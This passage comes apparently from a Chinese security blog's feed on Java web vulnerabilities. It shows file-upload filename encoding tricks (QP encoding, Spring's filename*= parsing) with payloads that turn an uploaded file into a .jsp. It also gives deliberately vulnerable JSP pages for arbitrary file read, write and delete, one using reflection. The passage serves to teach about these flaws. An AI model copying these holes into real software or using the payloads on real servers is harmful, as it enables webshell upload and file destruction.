class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.javaweb.utils.FileUtils;</span><br><span class="line"><span class="keyword">import</span> org.javaweb.utils.HttpServletResponseUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.javaweb.utils.HttpServletRequestUtils.getDocumentRoot;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/FileUpload/&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUploadController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/upload.php&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">uploadPage</span><span class="params">(HttpServletResponse response)</span> &#123;</span><br><span class="line">        HttpServletResponseUtils.responseHTML(response, <span class="string">&quot;&lt;!DOCTYPE html&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;html lang=\&quot;en\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;head&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;meta charset=\&quot;UTF-8\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;title&gt;File upload&lt;/title&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/head&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;body&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;form action=\&quot;/FileUpload/upload.do\&quot; enctype=\&quot;multipart/form-data\&quot; method=\&quot;post\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;p&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        用户名: &lt;input name=\&quot;username\&quot; type=\&quot;text\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        文件: &lt;input id=\&quot;file\&quot; name=\&quot;file\&quot; type=\&quot;file\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/p&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;input name=\&quot;submit\&quot; type=\&quot;submit\&quot; value=\&quot;Submit\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/form&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/body&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/upload.do&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">upload</span><span class="params">(String username, <span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file, HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="comment">// 文件名称</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span>   <span class="operator">=</span> <span class="string">&quot;uploads/&quot;</span> + username + <span class="string">&quot;/&quot;</span> + file.getOriginalFilename();</span><br><span class="line">        <span class="type">File</span>   <span class="variable">uploadFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getDocumentRoot(request), filePath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 上传目录</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">uploadDir</span> <span class="operator">=</span> uploadFile.getParentFile();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 上传文件对象</span></span><br><span class="line">        Map&lt;String, Object&gt; jsonMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, Object&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!uploadDir.exists()) &#123;</span><br><span class="line">            uploadDir.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileUtils.copyInputStreamToFile(file.getInputStream(), uploadFile);</span><br><span class="line"></span><br><span class="line">            jsonMap.put(<span class="string">&quot;url&quot;</span>, filePath);</span><br><span class="line">            jsonMap.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;上传成功!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            jsonMap.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;上传失败，服务器异常!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-文件上传-编码特性"><a href="#4-文件上传-编码特性" class="headerlink" title="4. 文件上传 - 编码特性"></a>4. 文件上传 - 编码特性</h2><h3 id="4-1-QP编码"><a href="#4-1-QP编码" class="headerlink" title="4.1 QP编码"></a>4.1 QP编码</h3><p>QP编码（ quoted-printable）是邮件协议中的一种内容编码方式，Quoted-printable是使用可打印的ASCII字符（如字母、数字与“&#x3D;”）表示各种编码格式下的字符，以便能在7-bit数据通路上传输8-bit数据, 或者更一般地说在非8-bit clean媒体上正确处理数据，这被定义为MIME content transfer encoding</p><p><strong>示例 - JavaQP编码代码：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.mail.internet.MimeUtility&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">qp</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;qp&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> MimeUtility.encodeWord(qp);</span><br><span class="line">    <span class="type">String</span> <span class="variable">decode</span> <span class="operator">=</span> MimeUtility.decodeWord(encode);</span><br><span class="line"></span><br><span class="line">    out.println(<span class="string">&quot;&lt;pre&gt;\nQP-Encoding: &quot;</span> + encode + <span class="string">&quot;\nQP-Decode: &quot;</span> + decode);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>字符串：测试.jsp编码后的结果如下：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/image-20201119110638971.png"></p><p>QP编码本与文件上传没有什么关系，但是由于在Java中最常用的Apache commons fileupload库从1.3开始支持了RFC 2047 Header值编码，从而支持解析使用QP编码后的文件名。</p><p>上传文件的时候选一个文件名经过QP编码后的文件，如：&#x3D;?UTF-8?Q?&#x3D;E6&#x3D;B5&#x3D;8B&#x3D;E8&#x3D;AF&#x3D;95&#x3D;2Ejsp?&#x3D;（测试.jsp）。</p><p>编码处理类：org.apache.commons.fileupload.util.mime.MimeUtility#decodeText</p><p>所以在文件上传中，上传被编码后的文件名(&#x3D;?UTF-8?Q?&#x3D;E6&#x3D;B5&#x3D;8B&#x3D;E8&#x3D;AF&#x3D;95&#x3D;2Ejsp?&#x3D;)，文件上传成功后文件名被编码成了测试.jsp。</p><p>Spring MVC中同样支持QP编码，在Spring中有两种处理Multipart的Resolver： org.springframework.web.multipart.commons.CommonsMultipartResolver和org.springframework.web.multipart.support.StandardServletMultipartResolver。CommonsMultipartResolver使用的是commons fileupload解析的所以支持QP编码。StandardMultipartHttpServletRequest比较特殊，Spring 4没有处理QP编码</p><p>但是在Spring 5修改了实现，如果文件名是&#x3D;?开始?&#x3D;结尾的话会调用javax.mail库的MimeDelegate解析QP编码</p><p>javax.mail库不是JDK自带的，必须自行引包，如果不存在该包也将无法解析，SpringBoot + Spring4默认使用的是StandardServletMultipartResolver，但是基于配置的Spring MVC中经常会使用CommonsMultipartResolver</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;multipartResolver&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;defaultEncoding&quot;</span> <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxUploadSize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;50000000&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxInMemorySize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1024&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-2-Spring-内置文件名编码特性"><a href="#4-2-Spring-内置文件名编码特性" class="headerlink" title="4.2 Spring 内置文件名编码特性"></a>4.2 Spring 内置文件名编码特性</h3><p>Spring会对文件上传的名称做特殊的处理，org.springframework.web.multipart.support.StandardMultipartHttpServletRequest#parseRequest内置了一种比较特殊的解析文件名的方式，如果传入的multipart请求无法直接使用filename&#x3D;解析出文件名，Spring还会使用content-disposition解析一次（使用filename*&#x3D;解析文件名）。</p><p>在文件上传时，修改Content-Disposition中的filename&#x3D;为</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename*<span class="operator">=</span><span class="string">&quot;UTF-8&#x27;1.jpg&#x27;1.jsp&quot;</span></span><br></pre></td></tr></table></figure><p>extractFilenameWithCharset支持对传入的文件名编码，示例中传入的UTF-8’1.jpg’1.jsp会被解析成UTF-8编码，最终的文件名为1.jsp，而1.jpg则会被丢弃。</p><p><strong>Spring5</strong>的org.springframework.web.multipart.support.StandardMultipartHttpServletRequest#parseRequest除了支持QP编码以外，优化了Spring4的解析文件名的方式：</p><p>Payload:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename*<span class="operator">=</span><span class="string">&quot;UTF-8&#x27;1.jpg&#x27;=?UTF-8?Q?=E6=B5=8B=E8=AF=95=2Ejsp?=&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java Web常见漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java Web常见漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Web文件访问漏洞</title>
      <link href="/2025/08/21/java%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/08/21/java%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="文件访问类漏洞"><a href="#文件访问类漏洞" class="headerlink" title="文件访问类漏洞"></a>文件访问类漏洞</h1><p>通常把这类漏洞归为一个类型，因为产生漏洞的原因都是因为程序对文件或目录访问控制不严、程序内部逻辑错误导致的任意文件或目录恶意访问漏洞。</p><h2 id="1-任意文件读取"><a href="#1-任意文件读取" class="headerlink" title="1. 任意文件读取"></a>1. 任意文件读取</h2><p>任意文件读写漏洞即因为没有验证请求的资源文件是否合法导致的，此类漏洞在Java中有着较高的几率出现，任意文件读取漏洞原理很简单，但一些知名的中间件：Weblogic、Tomcat、Resin又或者是主流MVC框架:Spring MVC、Struts2都存在此类漏洞。</p><p><strong>示例 - 存在恶意文件读取漏洞代码：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.File&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.FileInputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 获取参数并进行基本验证</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="comment">// 构建文件路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">basePath</span> <span class="operator">=</span> application.getRealPath(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(basePath, fileName); <span class="comment">// 使用File的构造函数处理路径拼接</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证文件是否存在且是文件</span></span><br><span class="line">    <span class="keyword">if</span> (!file.exists() || !file.isFile()) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;文件不存在&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        in = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">int</span> tempbyte;</span><br><span class="line">        <span class="keyword">while</span> ((tempbyte = in.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">            out.write(tempbyte);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;读取文件时发生错误: &quot;</span> + e.getMessage());</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 确保资源关闭</span></span><br><span class="line">        <span class="keyword">if</span> (in != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                in.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure><h3 id="1-1-目录任意文件读取漏洞测试"><a href="#1-1-目录任意文件读取漏洞测试" class="headerlink" title="1.1 目录任意文件读取漏洞测试"></a>1.1 目录任意文件读取漏洞测试</h3><p>攻击者通过传入恶意的name参数可以读取服务器中的任意文件:<a href="http://localhost:8080/s1/?name=index.jsp%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%EF%BC%9A">http://localhost:8080/s1/?name=index.jsp，如下图：</a><br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-21%20150315.png"></p><h2 id="2-写文件"><a href="#2-写文件" class="headerlink" title="2. 写文件"></a>2. 写文件</h2><p><strong>示例 - 存在恶意文件写入漏洞的代码：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.File&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.FileOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 获取参数</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;f&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;c&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 参数验证</span></span><br><span class="line">    <span class="keyword">if</span> (fileName == <span class="literal">null</span> || fileName.trim().isEmpty() ||</span><br><span class="line">            content == <span class="literal">null</span>) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;错误：文件名和内容参数不能为空&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">baseDir</span> <span class="operator">=</span> application.getRealPath(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(baseDir, fileName);</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 写入文件</span></span><br><span class="line">        fos = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        fos.write(content.getBytes(<span class="string">&quot;UTF-8&quot;</span>)); <span class="comment">// 指定字符编码</span></span><br><span class="line">        fos.flush();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出结果</span></span><br><span class="line">        out.println(<span class="string">&quot;文件路径：&quot;</span> + file.getAbsolutePath() + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;文件是否存在：&quot;</span> + file.exists());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;写入文件时发生错误：&quot;</span> + e.getMessage());</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 确保资源关闭</span></span><br><span class="line">        <span class="keyword">if</span> (fos != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fos.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="2-1-跨目录写入文件测试"><a href="#2-1-跨目录写入文件测试" class="headerlink" title="2.1 跨目录写入文件测试"></a>2.1 跨目录写入文件测试</h3><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-21%20195704.png"></p><h2 id="3-删除文件"><a href="#3-删除文件" class="headerlink" title="3. 删除文件"></a>3. 删除文件</h2><h3 id="3-1-任意文件删除测试"><a href="#3-1-任意文件删除测试" class="headerlink" title="3.1 任意文件删除测试"></a>3.1 任意文件删除测试</h3><p><strong>示例 - 存在任意文件删除漏洞代码：</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.File&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 获取文件参数</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;file&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证参数是否为空</span></span><br><span class="line">    <span class="keyword">if</span> (fileName == <span class="literal">null</span> || fileName.trim().isEmpty()) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;错误：文件参数不能为空&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">baseDir</span> <span class="operator">=</span> application.getRealPath(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="type">File</span> <span class="variable">targetFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(baseDir, fileName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查文件是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (!targetFile.exists()) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;错误：文件不存在 - &quot;</span> + targetFile.getAbsolutePath());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 执行删除操作</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isDeleted</span> <span class="operator">=</span> targetFile.delete();</span><br><span class="line">        <span class="keyword">if</span> (isDeleted) &#123;</span><br><span class="line">            out.println(<span class="string">&quot;成功：文件已删除 - &quot;</span> + targetFile.getAbsolutePath());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            out.println(<span class="string">&quot;失败：无法删除文件 - &quot;</span> + targetFile.getAbsolutePath());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;错误：没有权限删除文件 - &quot;</span> + e.getMessage());</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>攻击者通过参入file参数即可删除服务器中的任意文件：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-21%20200438.png"></p><h3 id="3-2-FileSystem任意文件删除测试"><a href="#3-2-FileSystem任意文件删除测试" class="headerlink" title="3.2 FileSystem任意文件删除测试"></a>3.2 FileSystem任意文件删除测试</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.File&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;file&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.io.DefaultFileSystem&quot;</span>).getMethod(<span class="string">&quot;getFileSystem&quot;</span>);</span><br><span class="line">    m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">fs</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Method</span> <span class="variable">m2</span> <span class="operator">=</span> fs.getClass().getMethod(<span class="string">&quot;delete&quot;</span>, File.class);</span><br><span class="line">    m2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    out.print(m2.invoke(fs, <span class="keyword">new</span> <span class="title class_">File</span>(file)));</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>攻击者通过反射调用 Filesystem 